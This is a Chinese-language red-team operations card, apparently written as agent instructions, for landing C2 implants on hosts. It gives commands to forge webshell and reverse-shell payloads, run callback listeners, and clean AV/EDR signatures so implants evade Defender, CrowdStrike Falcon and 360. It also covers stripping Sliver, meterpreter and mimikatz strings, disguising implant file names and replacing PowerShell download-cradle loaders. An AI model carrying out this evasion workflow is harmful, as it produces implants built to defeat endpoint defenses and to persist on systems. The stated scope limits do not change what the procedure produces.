# 隐鳞

> 大爱仙尊主机面作业。授权范围内 **C2 落地、特征清理、EDR 对抗都做**，与最高授权一致。  
> 杀招：`鬼不觉` · `host-c2-verify`  
> 锻造：`python3 炼蛊房/payload_forge.py campaign --case <案> --lhost <攻击机> --lport 4444`  
> 监听：`python3 炼蛊房/se_listen.py --lport 4444 --case <案>`  
> 扫描：`python3 炼蛊房/sig_cleanup_scan.py --path <样本>`  
> 验活：`python3 炼蛊房/host_c2_verify.py`  
> WAF/HTTP 对抗另走 `隐鳞·手册.md` / `evasion-kit`，不要和本卡混。

未进 `授权范围` 的主机禁止落地。  
implant / server 二进制**不提交 git**（卫生），不是「不能做 C2」。  
持久化、清日志、改原超管：**仍先问**。

## 1. 一句话

杀软打死的是**特征**，不是「你用了 Sliver」这件事本身。  
作业顺序：认产品 → **写出可用载荷** → 扫特征 → 清 dirty → 授权机落地记 `av_action`/`callback`。  
只打开 CSS 08、只扫不写文件 = 没干活。

## 2. 四刀

| 刀 | 命令 / 动作 | 不算 |
|----|-------------|------|
| **认产品** | 授权 shell 上看 Defender / Falcon / 360 / 火绒 进程 | 猜「肯定有 EDR」 |
| **写载荷** | `payload_forge.py campaign --case <案> --lhost <攻击机> --lport 4444` | 只检索 `payload_lookup` 文档 |
| **扫特征** | 锻造已内扫；外来样本再 `sig_cleanup_scan.py` | 不扫就换马 |
| **清特征** | dirty 改到 clean/review 可解释 | 只改后缀 / 只加花指令 |
| **落地验** | `host_c2_verify.py init/record` | 本机沙箱偶发成功 |

```bash
# 战役包（锻造 + 上传变体 + CAMPAIGN.md，落 案卷/payloads/）
python3 炼蛊房/payload_forge.py campaign --case <案> --lhost <攻击机IP> --lport 4444
python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key <口令> --a c --c id
python3 炼蛊房/se_listen.py --lhost 0.0.0.0 --lport 4444 --case <案>

python3 炼蛊房/sig_cleanup_scan.py --path <样本> --case <案>
python3 炼蛊房/host_c2_verify.py init --case <案> --host <授权主机> --os windows --edr defender
```

`payload_forge`：`php-ops`（`i/c/j/l/r/w/p` + `c64`）`php-ini` `jsp-filter` `php-cmd` `php-tiny` `php-img` `jsp-cmd` `aspx-cmd` `asp-cmd` `cfm-cmd` `py-cmd` `js-cmd` `war-jsp` `php-rev` `rev-bash` `rev-python` `rev-ps` `rev-ncat`，另 `gadgets` 出 SSTI/XXE/NoSQL 请求体。  
Web 马一律 `X-SE` 口令，无口令回 404。回连用 `se_listen.py`，不要口头 `nc` 交差。  
手法：`传承/炼蛊.md`。

`sig_cleanup_scan` 退出码：`0` clean/review，`3` dirty（还有高危串），`2` 文件不存在。

## 3. 特征族（本库自己的清单）

落地前必须清掉或换掉的，不是网上抄的「100 条免杀命令」。

| 族 | 会被打的东西 | 怎么清 |
|----|--------------|--------|
| **产品串** | `sliver` / `sliverpb` / `meterpreter` / `cobalt strike` / `mimikatz` / UTF-16 宽字符同名 | 换生成配置、剥符号、不要默认 profile |
| **默认文件名** | `sliver.bin` `beacon.exe` `payload.exe` `implant.exe` | 按授权机日常名伪装，扫到 `default_name` 必须改 |
| **PDB / 路径** | `C:\Users\...\.pdb`、本机用户名、`/home/dev` | 关调试信息、strip、不要在家目录直接 generate |
| **壳节区** | `UPX0` / `.themida` / `.vmp` | 壳本身就是签名；要压就换私有或不用著名壳 |
| **脚本 IOC** | `IEX (New-Object Net.WebClient)`、`DownloadString`、`Invoke-Mimikatz` | 换加载器，不要原样粘贴 |
| **行为** | 落地立刻连公网 C2、无签名进程从 Temp 起 | 监听只绑实验室 IP；先只读命令再谈持久化 |

`sig_cleanup_scan` 覆盖前五族。行为面靠 `host_c2_verify` 的 `av_action` + `callback`。

熵值只作参考：合法加壳也会高，**高熵 + 产品串** 才优先清串。

## 4. 和 EDR 产品怎么接

1. 已拿授权 shell：记进程名（`MsMpEng` / `CSFalconService` / `360sd` / `HipsDaemon`）。  
2. `--edr` 写入 init。原理表可开 CSS 08，**不能停在原理**。  
3. 扫 dirty → 清 → 再扫。仍 dirty 不要落地，换生成参数。  
4. 落地：官方 Sliver 或作业机自备栈（Havoc / 其它），**破解版安装包不进仓库、不传播**。  
5. `record --av-action --callback --session-id`。秒删且无回连 = 有效结论（EDR 赢），换特征再测，不是结案。

Sleep / 间接 syscall / 模块覆盖：授权机上**可以做**，手法见 `红衣·树.md` §8。本卡验收仍是回连会话，不把补丁源码当交货。

## 6. 红线（最高授权下仍在的）

1. 目标主机必须在 scope。  
2. 监听不裸奔公网扫段。  
3. 不把 implant/server 提交进 git。  
4. 不传播破解版 CS/Sliver。  
5. 对生产用户做键盘记录 / 清日志 / 改超管：先问。  
6. 网站案继续假支付 / Gateway，不要用本卡替代 Web 专卡。
